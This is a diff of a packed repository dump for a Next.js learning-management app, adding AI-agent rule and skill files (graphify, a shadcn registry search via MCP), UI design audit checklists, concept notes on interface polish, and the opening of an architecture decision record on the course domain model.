@@ -68,6 +68,10 @@ The content is organized as follows:
       SKILL.md
     next-dev-loop/
       SKILL.md
+    search-registry-items/
+      references/
+        TOOL-REFERENCE.md
+      SKILL.md
   workflows/
     graphify.md
 .github/
@@ -97,6 +101,7 @@ docs/
     001-use-layered-architecture.md
     002-use-neon-with-prisma.md
     003-use-shadcn-ui.md
+    004-lms-domain-model.md
     Enforcement Layer Overlap.md
     Font Ban Conflicts.md
     Motion Doctrine Conflicts.md
@@ -147,16 +152,6 @@ docs/
     Make Interfaces Feel Better.md
     Taste Skill Project.md
     Vercel Web Design Guidelines.md
-  tasks/
-    00-overview.md
-    01-architecture-foundation.md
-    02-user-profile-roles.md
-    03-course-curriculum-domain.md
-    04-lesson-content-authoring.md
-    05-enrollment-progress-tracking.md
-    06-course-catalog-player.md
-    07-instructor-dashboard.md
-    08-qa-security-documentation.md
   AI Instructions.md
   Architecture.md
   Authentication.md
@@ -177,6 +172,10 @@ public/
   vercel.svg
   window.svg
 src/
+  __tests__/
+    security/
+      idor.test.ts
+      xss.test.ts
   actions/
     __tests__/
       auth.test.ts
@@ -534,6 +533,25 @@ tsconfig.json
  98: * using `gh pr merge --admin`
  99: 
 100: Never use `--admin` unless explicitly requested by the user.
+`````
+
+## File: .agents/rules/graphify.md
+`````markdown
+ 1: ---
+ 2: trigger: always_on
+ 3: description: Consult the graphify knowledge graph at graphify-out/ for codebase and architecture questions.
+ 4: ---
+ 5: 
+ 6: ## graphify
+ 7: 
+ 8: This project has a graphify knowledge graph at graphify-out/.
+ 9: 
+10: Rules:
+11: 
+12: - For codebase or architecture questions, when `graphify-out/graph.json` exists, first run `graphify query "<question>"` (CLI) or `query_graph` (MCP). Use `graphify path "<A>" "<B>"` / `shortest_path` for relationships and `graphify explain "<concept>"` / `get_node` for focused concepts. These return a scoped subgraph, usually much smaller than `GRAPH_REPORT.md` or raw grep output.
+13: - If graphify-out/wiki/index.md exists, navigate it instead of reading raw files
+14: - Read graphify-out/GRAPH_REPORT.md only for broad architecture review or when query/path/explain do not surface enough context
+15: - After modifying code files in this session, run `graphify update .` to keep the graph current (AST-only, no API cost)
 `````
 
 ## File: .agents/rules/operating-system.md
@@ -2128,6 +2146,555 @@ tsconfig.json
 183: keeps the user logged in. Leave `next dev` up for the next loop.
 `````
 
+## File: .agents/skills/search-registry-items/references/TOOL-REFERENCE.md
+`````markdown
+ 1: # Tool Reference
+ 2: 
+ 3: Read this file when you need parameter details, response fields, or pagination behavior.
+ 4: 
+ 5: ## MCP server
+ 6: 
+ 7: | Field | Value |
+ 8: | ----- | ----- |
+ 9: | Server | `user-shoogle` |
+10: | Tool | `search_registry_items` *(only enabled tool)* |
+11: | Endpoint | `https://mcp.shoogle.dev/mcp` |
+12: 
+13: Call via `CallMcpTool` on server `user-shoogle`. Read the MCP tool descriptor before calling if parameters may have changed.
+14: 
+15: ## Search behavior
+16: 
+17: `query` runs **full-text matching** against indexed `name` and `description` fields. It does not search titles or use semantic/vector ranking.
+18: 
+19: - Prefer short keywords: `button`, `hero`, `data-table`
+20: - Description matches are valid — e.g. `animated` may surface items whose description mentions animation
+21: - Avoid registry prefixes in the query (`@acme/button` → query `button`)
+22: 
+23: 
+24: | Parameter | Type | Required | Default | Notes |
+25: | --------- | ---- | -------- | ------- | ----- |
+26: | `query` | string | yes | — | Full-text search on item `name` and `description` |
+27: | `offset` | number | no | `0` | Pagination start index |
+28: | `limit` | number | no | `100` | Page size; max `100` |
+29: 
+30: ## Response
+31: 
+32: ```json
+33: {
+34:   "query": "button",
+35:   "pagination": {
+36:     "total": 42,
+37:     "offset": 0,
+38:     "limit": 100,
+39:     "hasMore": false
+40:   },
+41:   "items": [
+42:     {
+43:       "name": "button",
+44:       "type": "registry:ui",
+45:       "description": "…",
+46:       "registry": "shadcn",
+47:       "addCommandArgument": "shadcn/button"
+48:     }
+49:   ],
+50:   "totalResults": 42,
+51:   "timestamp": "2026-05-22T…"
+52: }
+53: ```
+54: 
+55: ## Item fields
+56: 
+57: | Field | Use |
+58: | ----- | --- |
+59: | `name` | Item name in the registry JSON |
+60: | `type` | e.g. `registry:ui`, `registry:block` |
+61: | `description` | Optional short description |
+62: | `registry` | Namespace used as `@`-prefix in CLI |
+63: | `addCommandArgument` | Pass to `npx shadcn@latest add` — e.g. `acme/button` |
+64: 
+65: ## Pagination
+66: 
+67: Increment `offset` by `limit` while `pagination.hasMore` is `true`. Stop when you have enough candidates or `hasMore` is `false`.
+68: 
+69: ## Call examples
+70: 
+71: ```json
+72: { "query": "button" }
+73: { "query": "card", "offset": 100, "limit": 100 }
+74: { "query": "sidebar", "limit": 20 }
+75: ```
+`````
+
+## File: .agents/skills/search-registry-items/SKILL.md
+`````markdown
+ 1: ---
+ 2: name: search-registry-items
+ 3: description: >
+ 4:   Find shadcn registry items by keyword to install, compare registries, or verify before add.
+ 5:   Use when the user wants a component but didn't give @registry/name or asks which registry has
+ 6:   X — even without mentioning MCP. Keyword on names/descriptions only; not layouts, blocks, or
+ 7:   semantic search (shoogle.dev/search). Skip known add targets.
+ 8: compatibility: Requires the Shoogle MCP server (`user-shoogle`) with network access. Setup guide at https://shoogle.dev/mcp-install
+ 9: allowed-tools: CallMcpTool
+10: metadata:
+11:   user-invocable: "false"
+12: ---
+13: 
+14: # Search Registry Items
+15: 
+16: Look up indexed shadcn registry catalog entries via **full-text search** on item `name` and `description`. Returns the registry namespace and `addCommandArgument` for `npx shadcn@latest add`.
+17: 
+18: Default tool call:
+19: 
+20: ```json
+21: CallMcpTool({ "server": "user-shoogle", "toolName": "search_registry_items", "arguments": { "query": "button" } })
+22: ```
+23: 
+24: ## Workflow
+25: 
+26: Progress:
+27: 
+28: - [ ] Call `search_registry_items` on `user-shoogle` with a short keyword or name fragment (not a full sentence)
+29: - [ ] Present matches as the output table below — never dump raw JSON
+30: - [ ] If multiple registries share the same name, ask which registry to use
+31: - [ ] Install with `npx shadcn@latest add {addCommandArgument}` (or the project's package runner)
+32: - [ ] Paginate only when needed (`offset` += `limit` while `pagination.hasMore`)
+33: 
+34: Skip search when the user already gave the exact add target (e.g. `@cult-ui/gradient-button`) — go straight to `view` / `add`.
+35: 
+36: For install and composition rules after search, use the [shadcn skill](https://github.com/shadcn-ui/ui/blob/main/skills/shadcn/SKILL.md).
+37: 
+38: ## Gotchas
+39: 
+40: - **One MCP tool only.** `user-shoogle` exposes `search_registry_items`. Block and semantic MCP tools (`search`, `search_vectors`) are not available — use [shoogle.dev/search](https://shoogle.dev/search) instead. Do not use `npx shadcn@latest search` for this workflow.
+41: - **Full-text on `name` and `description`.** Matching uses full-text search across both fields — not item titles, and not semantic/vector search. A query like `carousel` can match items named `carousel` or whose description mentions carousels.
+42: - **Keywords, not intent.** Multi-concept natural-language queries like "login page with dark mode" won't work well. For semantic block discovery, send the user to [shoogle.dev/search](https://shoogle.dev/search).
+43: - **Query the item name, not the registry prefix.** Use `button`, not `@acme/button`. Filter by `registry` in results.
+44: - **Short fragments beat sentences.** Prefer `button`, `hero`, `data-table`. Empty or whitespace queries return nothing.
+45: - **No results?** Try shorter fragments or synonyms (`dialog` vs `modal`).
+46: - **`addCommandArgument` is the install target.** Use it verbatim: `npx shadcn@latest add cult-ui/gradient-button`. Do not reconstruct from `@registry/name`.
+47: - **Pagination cap is 100.** Default page size is 100; mention `pagination.total` when results span pages.
+48: 
+49: If MCP is unavailable, point to [shoogle.dev/mcp-install](https://shoogle.dev/mcp-install). For parameter or response details, read [references/TOOL-REFERENCE.md](references/TOOL-REFERENCE.md).
+50: 
+51: ## Output format
+52: 
+53: Always respond with a markdown table:
+54: 
+55: | name | registry | add command | type | description |
+56: | ---- | -------- | ----------- | ---- | ----------- |
+57: 
+58: - **add command**: `npx shadcn@latest add {addCommandArgument}` when present
+59: - Use `—` for empty descriptions
+60: - End with match count and page info when relevant
+61: 
+62: **Example** — user asks for button components across registries:
+63: 
+64: | name | registry | add command | type | description |
+65: | ---- | -------- | ----------- | ---- | ----------- |
+66: | button | shadcn | `npx shadcn@latest add shadcn/button` | registry:ui | A clickable button component |
+67: | button | cult-ui | `npx shadcn@latest add cult-ui/button` | registry:ui | Animated button variants |
+68: 
+69: Found 2 matches (showing 1–2 of 2). Which registry should I add from?
+70: 
+71: ## Out of scope
+72: 
+73: | Need | Use instead |
+74: | ---- | ----------- |
+75: | Registry item by name or description | `search_registry_items` (this skill) |
+76: | Block keyword search | [shoogle.dev/search](https://shoogle.dev/search) |
+77: | Semantic / layout discovery | [shoogle.dev/search](https://shoogle.dev/search) |
+78: | Install a known item | shadcn CLI `add` / `view` |
+79: | Browse one registry | `npx shadcn@latest search @registry -q "…"` |
+`````
+
+## File: .agents/workflows/graphify.md
+`````markdown
+ 1: ---
+ 2: name: graphify
+ 3: description: Turn any folder of files into a navigable knowledge graph
+ 4: ---
+ 5: 
+ 6: # Workflow: graphify
+ 7: 
+ 8: Follow the graphify skill installed at ~/.gemini/config/skills/graphify/SKILL.md to run the full pipeline.
+ 9: 
+10: If no path argument is given, use `.` (current directory).
+`````
+
+## File: .husky/pre-commit
+`````
+1: #!/bin/dash
+2: pnpm exec lint-staged
+`````
+
+## File: docs/audits/Brand Fidelity Audit.md
+`````markdown
+ 1: # Brand Fidelity Audit
+ 2: 
+ 3: Verify that redesigns preserve brand identity and URLs.
+ 4: 
+ 5: ---
+ 6: 
+ 7: # Rules
+ 8: 
+ 9: - Never change existing URLs without explicit decision.
+10: - Never change brand identity without explicit decision.
+11: - Document every change that affects brand or routing.
+12: - Record the before and after state.
+13: 
+14: ---
+15: 
+16: # What to Check
+17: 
+18: ## URLs
+19: 
+20: - [ ] All existing URLs preserved.
+21: - [ ] New URLs follow existing patterns.
+22: - [ ] Redirects in place for any changed URLs.
+23: 
+24: ## Brand Identity
+25: 
+26: - [ ] Logo and wordmark unchanged.
+27: - [ ] Brand colors preserved (unless explicitly updated).
+28: - [ ] Brand typography preserved (unless explicitly updated).
+29: - [ ] Brand voice and tone consistent.
+30: 
+31: ## Visual Identity
+32: 
+33: - [ ] Consistent visual language across pages.
+34: - [ ] No jarring style changes between sections.
+35: - [ ] Transition between old and new design is smooth.
+36: 
+37: ---
+38: 
+39: # Documentation
+40: 
+41: Record all changes:
+42: 
+43: - What changed.
+44: - Why it changed.
+45: - Who approved the change.
+46: - Impact on existing users.
+47: 
+48: ---
+49: 
+50: # Sources
+51: 
+52: - Gogh maturity gates - Brand preservation rules.
+53: - Taste Skill v2 - Redesign protocol.
+`````
+
+## File: docs/audits/Impeccable Audit and Detect.md
+`````markdown
+ 1: # Impeccable Audit and Detect
+ 2: 
+ 3: Automated visual and engineering defect detection using Impeccable.
+ 4: 
+ 5: ---
+ 6: 
+ 7: # Installation
+ 8: 
+ 9: ```bash
+10: npx impeccable install
+11: ```
+12: 
+13: ---
+14: 
+15: # Running Detection
+16: 
+17: ```bash
+18: npx impeccable detect
+19: ```
+20: 
+21: This runs 45 deterministic rules without an LLM.
+22: 
+23: ---
+24: 
+25: # What It Detects
+26: 
+27: - Typography violations.
+28: - Color violations.
+29: - Layout violations.
+30: - Interaction violations.
+31: - Performance violations.
+32: - Accessibility violations.
+33: 
+34: ---
+35: 
+36: # Named Anti-Slop Tells
+37: 
+38: - Inter for everything without justification.
+39: - Purple-to-blue gradients.
+40: - Cards nested in cards.
+41: - Decorative grid backgrounds.
+42: - Two-axis gradient overlay patterns.
+43: 
+44: ---
+45: 
+46: # CI/CD Integration
+47: 
+48: Add to your CI pipeline:
+49: 
+50: ```bash
+51: npx impeccable detect --ci
+52: ```
+53: 
+54: Fails the build if any critical violations are found.
+55: 
+56: ---
+57: 
+58: # Manual Review
+59: 
+60: After automated detection:
+61: 
+62: 1. Review findings.
+63: 2. Fix critical violations first.
+64: 3. Address warnings based on priority.
+65: 4. Document any intentional deviations.
+66: 
+67: ---
+68: 
+69: # Sources
+70: 
+71: - pbakaus/impeccable (Apache-2.0).
+72: - impeccable.style.
+`````
+
+## File: docs/audits/MIFB Review Checklist.md
+`````markdown
+ 1: # MIFB Review Checklist
+ 2: 
+ 3: Micro-interaction and visual polish review based on Make Interfaces Feel Better.
+ 4: 
+ 5: ---
+ 6: 
+ 7: # Shadow Review
+ 8: 
+ 9: - [ ] Shadows composed from three layers (ambient, key, rim).
+10: - [ ] Shadows used instead of borders for depth.
+11: - [ ] Shadow color adjusted for dark mode.
+12: - [ ] No single-layer box-shadow.
+13: 
+14: ---
+15: 
+16: # Border Radius Review
+17: 
+18: - [ ] Concentric radius formula applied: outer = inner + padding.
+19: - [ ] Consistent radius scale across the page.
+20: - [ ] No mixed radius scales.
+21: 
+22: ---
+23: 
+24: # Press State Review
+25: 
+26: - [ ] All buttons have press feedback.
+27: - [ ] Press feedback: `scale(0.96)`.
+28: - [ ] Never below `scale(0.95)`.
+29: - [ ] Hover states present on all interactive elements.
+30: 
+31: ---
+32: 
+33: # Hit Area Review
+34: 
+35: - [ ] All interactive elements: 40x40px minimum.
+36: - [ ] Smaller elements extended with pseudo-elements.
+37: - [ ] Touch targets meet mobile requirements.
+38: 
+39: ---
+40: 
+41: # Animation Review
+42: 
+43: - [ ] Icon animations: scale 0.25->1, opacity 0->1, blur 4px->0.
+44: - [ ] Stagger delay: ~100ms between items.
+45: - [ ] Enter duration: ~800ms.
+46: - [ ] Exit subtler than enter.
+47: - [ ] `prefers-reduced-motion` honored.
+48: - [ ] Spring settings: duration 0.3, bounce 0.
+49: 
+50: ---
+51: 
+52: # Typography Review
+53: 
+54: - [ ] Font smoothing: `-webkit-font-smoothing: antialiased`.
+55: - [ ] Tabular nums for numeric data.
+56: - [ ] Optical alignment applied.
+57: - [ ] Line length: 45-90 characters.
+58: 
+59: ---
+60: 
+61: # Image Review
+62: 
+63: - [ ] Image outlines: 1px at 10% opacity.
+64: - [ ] Black outline in light mode, white in dark mode.
+65: 
+66: ---
+67: 
+68: # Sources
+69: 
+70: - jakubkrehel/make-interfaces-feel-better.
+71: - jakub.kr/writing/details-that-make-interfaces-feel-better.
+`````
+
+## File: docs/audits/Pre-Flight Check (Section 14).md
+`````markdown
+ 1: # Pre-Flight Check (Section 14)
+ 2: 
+ 3: Mandatory checklist before completing any page or component.
+ 4: 
+ 5: Every box must pass. Any failure blocks completion.
+ 6: 
+ 7: ---
+ 8: 
+ 9: # Design Dials
+10: 
+11: - [ ] Three dials set (Design Variance, Motion Intensity, Visual Density).
+12: - [ ] Dials committed before touching layout.
+13: 
+14: ---
+15: 
+16: # Color
+17: 
+18: - [ ] One accent color per page.
+19: - [ ] No purple-to-blue gradients.
+20: - [ ] No banned palettes (cream+terracotta, black+acid-green).
+21: - [ ] Design tokens from globals.css used consistently.
+22: - [ ] No hardcoded color values in Tailwind classes.
+23: 
+24: ---
+25: 
+26: # Typography
+27: 
+28: - [ ] Headlines use `text-wrap: balance`.
+29: - [ ] Body text uses `text-wrap: pretty`.
+30: - [ ] Body text: `max-w-[65ch]`.
+31: - [ ] Font smoothing enabled.
+32: - [ ] Tabular nums for numeric data.
+33: - [ ] No em-dashes or en-dashes in visible text.
+34: - [ ] Inter not used for everything without justification.
+35: 
+36: ---
+37: 
+38: # Hero
+39: 
+40: - [ ] Headline: max 2 lines.
+41: - [ ] Subtext: max 20 words.
+42: - [ ] CTA visible without scrolling.
+43: - [ ] Top padding: max `pt-24`.
+44: - [ ] Max 4 text elements.
+45: 
+46: ---
+47: 
+48: # Navigation
+49: 
+50: - [ ] Single line at desktop.
+51: - [ ] Height cap: 80px.
+52: - [ ] No hamburger on desktop.
+53: 
+54: ---
+55: 
+56: # Layout
+57: 
+58: - [ ] At least 4 layout families in 8-section pages.
+59: - [ ] Bento grids: exactly N cells for N items.
+60: - [ ] No cards nested inside cards.
+61: - [ ] Grid broken intentionally at least once.
+62: - [ ] Spacing feels deliberate, not uniform.
+63: 
+64: ---
+65: 
+66: # Interactions
+67: 
+68: - [ ] Interactive elements: 40x40px minimum hit area.
+69: - [ ] Press states: `scale(0.96)`.
+70: - [ ] Shadows: three-layer composition.
+71: - [ ] Borders avoided in favor of shadows.
+72: - [ ] Animations honor `prefers-reduced-motion`.
+73: - [ ] Icon animations: scale, opacity, blur with stagger.
+74: 
+75: ---
+76: 
+77: # Accessibility
+78: 
+79: - [ ] Focus rings visible on all interactive elements.
+80: - [ ] ARIA labels on icon-only buttons.
+81: - [ ] Semantic HTML elements.
+82: - [ ] Color contrast meets WCAG AA.
+83: - [ ] Keyboard navigation works.
+84: 
+85: ---
+86: 
+87: # Documentation Rules
+88: 
+89: Every significant change should update the relevant documentation.
+90: 
+91: Architecture decisions should be documented before implementation whenever possible.
+92: 
+93: Documentation should always reflect the current state of the project.
+`````
+
+## File: docs/audits/Preservation Audit.md
+`````markdown
+ 1: # Preservation Audit
+ 2: 
+ 3: Ensure existing functionality is not broken during redesigns.
+ 4: 
+ 5: ---
+ 6: 
+ 7: # Rules
+ 8: 
+ 9: - Never destroy existing functionality without explicit decision.
+10: - Never break existing tests without explicit decision.
+11: - Never remove existing features without explicit decision.
+12: - Document every removal or change.
+13: 
+14: ---
+15: 
+16: # What to Check
+17: 
+18: ## Functionality
+19: 
+20: - [ ] All existing features still work.
+21: - [ ] No regression in existing behavior.
+22: - [ ] All existing tests still pass.
+23: 
+24: ## Data
+25: 
+26: - [ ] No data loss.
+27: - [ ] No schema changes without migration.
+28: - [ ] No breaking changes to API contracts.
+29: 
+30: ## Performance
+31: 
+32: - [ ] No performance regression.
+33: - [ ] Bundle size does not increase significantly.
+34: - [ ] No new client-side JavaScript without justification.
+35: 
+36: ## Accessibility
+37: 
+38: - [ ] No accessibility regression.
+39: - [ ] All existing ARIA attributes preserved.
+40: - [ ] Focus management unchanged or improved.
+41: 
+42: ---
+43: 
+44: # Documentation
+45: 
+46: Record all changes:
+47: 
+48: - What was preserved.
+49: - What was changed.
+50: - Why the change was necessary.
+51: - Impact assessment.
+52: 
+53: ---
+54: 
+55: # Sources
+56: 
+57: - Gogh maturity gates - Preservation rules.
+58: - Taste Skill v2 - Section 11 redesign protocol.
+`````
+
 ## File: docs/audits/quality-audit.md
 `````markdown
  1: # Pre-Flight Quality Audit Checklist
@@ -2188,6 +2755,413 @@ tsconfig.json
 56: - [ ] **Docs Synchronized:** If domain invariants or architecture changed, were `docs/` files updated?
 57: - [ ] **ADR Recorded:** If a major architectural decision or dependency was introduced, was an ADR added to `docs/decisions/`?
 58: - [ ] **Clean Diff:** Did you review `git status` and `git diff` to ensure no unrelated files or debug code were committed?
+`````
+
+## File: docs/audits/Vercel Audit Guidelines.md
+`````markdown
+ 1: # Vercel Audit Guidelines
+ 2: 
+ 3: Performance and accessibility audit based on Vercel's web design guidelines.
+ 4: 
+ 5: ---
+ 6: 
+ 7: # Audit Process
+ 8: 
+ 9: 1. Read the target files.
+10: 2. Check all rules from `docs/rules/Vercel Interface Rule Categories.md`.
+11: 3. Output findings grouped by file in `file:line` format.
+12: 4. Mark each finding as pass/fail.
+13: 
+14: ---
+15: 
+16: # Accessibility Rules
+17: 
+18: - Icon-only buttons: `aria-label` present.
+19: - No `outline-none` without focus replacement.
+20: - No paste blocking on inputs.
+21: - `prefers-reduced-motion` honored.
+22: - Semantic HTML used.
+23: - Color contrast meets WCAG AA.
+24: 
+25: ---
+26: 
+27: # Performance Rules
+28: 
+29: - Server Components used by default.
+30: - Below-the-fold content lazy loaded.
+31: - Client JS minimized.
+32: - Streaming and Suspense used.
+33: - Critical navigation links prefetched.
+34: 
+35: ---
+36: 
+37: # Form Rules
+38: 
+39: - Labels associated with inputs.
+40: - Error messages linked via `aria-describedby`.
+41: - Required fields indicated.
+42: - Inline validation on blur.
+43: - No accidental state clearing.
+44: 
+45: ---
+46: 
+47: # Image Rules
+48: 
+49: - `width` and `height` on all images.
+50: - `next/image` used for optimization.
+51: - Alt text on meaningful images.
+52: - Decorative images: `alt=""`.
+53: 
+54: ---
+55: 
+56: # Output Format
+57: 
+58: ```
+59: file:line - PASS/FAIL - Description
+60: ```
+61: 
+62: Example:
+63: 
+64: ```
+65: app/page.tsx:42 - FAIL - Icon button missing aria-label
+66: components/ui/button.tsx:15 - PASS - Focus ring present
+67: ```
+68: 
+69: ---
+70: 
+71: # Sources
+72: 
+73: - vercel-labs/web-interface-guidelines (MIT).
+74: - vercel.com/design/guidelines.
+`````
+
+## File: docs/concepts/AI Slop.md
+`````markdown
+ 1: # AI Slop
+ 2: 
+ 3: Understanding and preventing generic AI-generated UI output.
+ 4: 
+ 5: ---
+ 6: 
+ 7: # What Is AI Slop
+ 8: 
+ 9: AI slop is the distributional convergence of LLM-generated frontends. Because LLMs are statistical pattern matchers, they reach for the median of their training corpus.
+10: 
+11: The result: Inter for everything, purple-to-blue gradients, cards nested in cards, and minimal animations.
+12: 
+13: ---
+14: 
+15: # Why It Happens
+16: 
+17: - LLMs default to safe, common patterns.
+18: - Training data is dominated by tutorial and template outputs.
+19: - The median of training data is generic, not distinctive.
+20: - Without constraints, agents produce the same layouts.
+21: 
+22: ---
+23: 
+24: # The Fix
+25: 
+26: Constraint, not prompting.
+27: 
+28: - Forbidden patterns (anti-slop tells).
+29: - Committed aesthetic direction (three dials).
+30: - Pre-flight checks (Section 14).
+31: - Evidence-gated claims (source-ledger).
+32: 
+33: ---
+34: 
+35: # Named Tells
+36: 
+37: From Impeccable's 45-rule detector:
+38: 
+39: - Inter for everything.
+40: - Purple-to-blue gradients.
+41: - Cards nested in cards.
+42: - Decorative grid backgrounds.
+43: - Two-axis gradient overlays.
+44: - Uniform spacing everywhere.
+45: - No micro-interactions.
+46: - Generic hero sections.
+47: 
+48: ---
+49: 
+50: # Prevention Strategy
+51: 
+52: 1. Set the three dials before building.
+53: 2. Commit to a palette and direction.
+54: 3. Check against anti-slop tells.
+55: 4. Run pre-flight before shipping.
+56: 5. Document design decisions.
+57: 
+58: ---
+59: 
+60: # Sources
+61: 
+62: - Taste Skill v2 (Leon Lin) - Anti-slop framework.
+63: - Anthropic frontend-design - Distributional convergence research.
+64: - prg.sh - "Why Your AI Keeps Building the Same Purple Gradient Website."
+`````
+
+## File: docs/concepts/Coaxing Beats Constraint.md
+`````markdown
+ 1: # Coaxing Beats Constraint
+ 2: 
+ 3: Why gentle guidance produces better design output than rigid rules.
+ 4: 
+ 5: ---
+ 6: 
+ 7: # The Problem
+ 8: 
+ 9: Rigid rules produce rigid output. When you tell an agent "use exactly 16px padding everywhere," you get uniform, lifeless layouts.
+10: 
+11: ---
+12: 
+13: # The Solution
+14: 
+15: Coaxing: setting direction and letting the agent fill in the details.
+16: 
+17: - Set the three dials (direction).
+18: - Define the palette (constraints).
+19: - Let the agent compose within those constraints.
+20: - Review and refine, not dictate.
+21: 
+22: ---
+23: 
+24: # How It Works
+25: 
+26: 1. Commit to a direction (three dials).
+27: 2. Define boundaries (palette, typography, radius).
+28: 3. Let the agent build within boundaries.
+29: 4. Critique and revise.
+30: 5. Never dictate every pixel.
+31: 
+32: ---
+33: 
+34: # When to Use Coaxing
+35: 
+36: - New features and components.
+37: - Landing pages and marketing sites.
+38: - Creative layouts and editorial designs.
+39: 
+40: ---
+41: 
+42: # When to Use Constraint
+43: 
+44: - Accessibility rules (non-negotiable).
+45: - Security rules (non-negotiable).
+46: - Architecture rules (non-negotiable).
+47: - Anti-slop tells (non-negotiable).
+48: 
+49: ---
+50: 
+51: # The Balance
+52: 
+53: - Coax for aesthetics.
+54: - Constrain for quality.
+55: - The three dials are coaxing tools.
+56: - The anti-slop tells are constraint tools.
+57: 
+58: ---
+59: 
+60: # Sources
+61: 
+62: - Taste Skill v2 (Leon Lin) - Coaxing vs constraint philosophy.
+`````
+
+## File: docs/concepts/Design Review as Infrastructure.md
+`````markdown
+ 1: # Design Review as Infrastructure
+ 2: 
+ 3: Making design review a systematic, repeatable process rather than a one-time check.
+ 4: 
+ 5: ---
+ 6: 
+ 7: # The Problem
+ 8: 
+ 9: Design review is typically ad-hoc: someone looks at the UI and gives subjective feedback. This does not scale and is not repeatable.
+10: 
+11: ---
+12: 
+13: # The Solution
+14: 
+15: Treat design review as infrastructure:
+16: 
+17: - Automated checks (Impeccable detector, ESLint, TypeScript).
+18: - Manual checklists (Section 14 pre-flight).
+19: - Source-gated claims (every rule cites a source).
+20: - Repeatable pipelines (audit pipeline flow).
+21: 
+22: ---
+23: 
+24: # Layers of Review
+25: 
+26: ## Automated
+27: 
+28: - TypeScript type checking.
+29: - ESLint linting.
+30: - Impeccable 45-rule detector.
+31: - Knip dead code detection.
+32: 
+33: ## Semi-Automated
+34: 
+35: - Section 14 pre-flight checklist.
+36: - Vercel audit guidelines.
+37: - MIFB review checklist.
+38: 
+39: ## Manual
+40: 
+41: - Brand fidelity audit.
+42: - Preservation audit.
+43: - Accessibility testing.
+44: - Performance profiling.
+45: 
+46: ---
+47: 
+48: # Integration
+49: 
+50: Design review should be part of:
+51: 
+52: - Pre-commit hooks (Husky).
+53: - CI/CD pipeline (automated checks).
+54: - Pull request review (manual checks).
+55: - Release process (full audit).
+56: 
+57: ---
+58: 
+59: # Documentation
+60: 
+61: Every review finding should be:
+62: 
+63: - Documented in the relevant docs folder.
+64: - Tracked to resolution.
+65: - Linked to the source rule.
+66: 
+67: ---
+68: 
+69: # Sources
+70: 
+71: - Developers Digest - "Taste Skills Are Turning Agent Review Into Infrastructure."
+72: - Impeccable - Deterministic detector as infrastructure.
+`````
+
+## File: docs/concepts/Interruptible Animation.md
+`````markdown
+ 1: # Interruptible Animation
+ 2: 
+ 3: Making animations that can be interrupted without breaking the interface.
+ 4: 
+ 5: ---
+ 6: 
+ 7: # The Problem
+ 8: 
+ 9: Non-interruptible animations frustrate users. When a user clicks a new target while an animation is running, the animation should stop cleanly and start the new one.
+10: 
+11: ---
+12: 
+13: # Rules
+14: 
+15: - All animations must be interruptible.
+16: - Use `transition` instead of `animation` when possible.
+17: - Prefer `transform` and `opacity` (GPU-accelerated).
+18: - Never animate layout properties (width, height, padding).
+19: 
+20: ---
+21: 
+22: # Implementation
+23: 
+24: ```tsx
+25: <div className="transition-all duration-300 ease-out">Content</div>
+26: ```
+27: 
+28: ---
+29: 
+30: # Animation Values
+31: 
+32: | Property        | Value              |
+33: | --------------- | ------------------ |
+34: | Enter duration  | ~800ms             |
+35: | Exit duration   | Subtler than enter |
+36: | Stagger delay   | ~100ms             |
+37: | Icon scale      | 0.25 -> 1          |
+38: | Icon opacity    | 0 -> 1             |
+39: | Icon blur       | 4px -> 0           |
+40: | Spring duration | 0.3                |
+41: | Spring bounce   | 0                  |
+42: 
+43: ---
+44: 
+45: # Reduced Motion
+46: 
+47: Always honor `prefers-reduced-motion`:
+48: 
+49: ```tsx
+50: @media (prefers-reduced-motion: reduce) {
+51:   * {
+52:     animation-duration: 0.01ms !important;
+53:     transition-duration: 0.01ms !important;
+54:   }
+55: }
+56: ```
+57: 
+58: ---
+59: 
+60: # Sources
+61: 
+62: - Make Interfaces Feel Better (Jakub Krehel) - Interruptible animations.
+63: - Vercel web-design-guidelines - Animation rules.
+`````
+
+## File: docs/concepts/Optical Alignment.md
+`````markdown
+ 1: # Optical Alignment
+ 2: 
+ 3: Making interfaces feel visually correct, not just mathematically correct.
+ 4: 
+ 5: ---
+ 6: 
+ 7: # The Problem
+ 8: 
+ 9: Mathematical centering does not always look centered. Elements with different visual weights appear off-center when mathematically centered.
+10: 
+11: ---
+12: 
+13: # The Solution
+14: 
+15: Optical alignment adjusts elements based on their visual weight, not their mathematical position.
+16: 
+17: ---
+18: 
+19: # Rules
+20: 
+21: - Heavier elements shift slightly toward center.
+22: - Lighter elements shift slightly away from center.
+23: - Icons align with text baselines, not bounding boxes.
+24: - Circular elements align by visual center, not bounding box.
+25: 
+26: ---
+27: 
+28: # Examples
+29: 
+30: - A circle next to text: shift the circle down 1-2px to align optical center with text baseline.
+31: - An icon next to text: shift the icon down to align with the text's x-height.
+32: - A heavy headline above light body text: shift headline slightly down.
+33: 
+34: ---
+35: 
+36: # Application
+37: 
+38: - Check every composition for optical alignment.
+39: - Adjust padding and margin for visual balance.
+40: - Do not rely solely on Tailwind's default spacing.
+41: - Use arbitrary values when optical correction is needed.
+42: 
+43: ---
+44: 
+45: # Sources
+46: 
+47: - Make Interfaces Feel Better (Jakub Krehel) - Optical alignment rules.
+48: - Refactoring UI (Wathan & Schoger) - Visual hierarchy principles.
 `````
 
 ## File: docs/decisions/001-use-layered-architecture.md
@@ -2303,6 +3277,292 @@ tsconfig.json
 29: - **Mantine**: Rejected. Too heavy, less customizable.
 `````
 
+## File: docs/decisions/004-lms-domain-model.md
+`````markdown
+ 1: # ADR-004: Use Dedicated Curriculum, Enrollment, and Isolated Progress Models
+ 2: 
+ 3: ## Status
+ 4: Accepted
+ 5: 
+ 6: ## Date
+ 7: 2026-09-12
+ 8: 
+ 9: ## Context
+10: A production-grade Learning Management System (LMS) must handle multi-tenant educational workflows across multiple user roles: instructors authoring curriculum, administrators supervising platforms, and students progressing through structured lessons. The data architecture must support:
+11: - Hierarchical course outlines (modules and lessons) with deterministic ordering.
+12: - Heavy instructional content (markdown, compiled HTML, video embeds, downloadable resources).
+13: - Many-to-many enrollment tracking with aggregate completion metrics.
+14: - Fine-grained per-student lesson progress tracking without cross-user leakage.
+15: - Concurrency control preventing unique constraint collisions during reordering and publishing.
+16: 
+17: ## Problem
+18: Naive LMS architectures suffer from several architectural flaws:
+19: 1. **Global Progress Flags**: Storing `isCompleted` directly on the `Lesson` entity prevents multi-student progress tracking and leaks completion state across users.
+20: 2. **Bloated Syllabus Queries**: Inlining rich markdown bodies, sanitized HTML, and resource attachments directly in the `Lesson` table degrades catalog and curriculum navigation query performance.
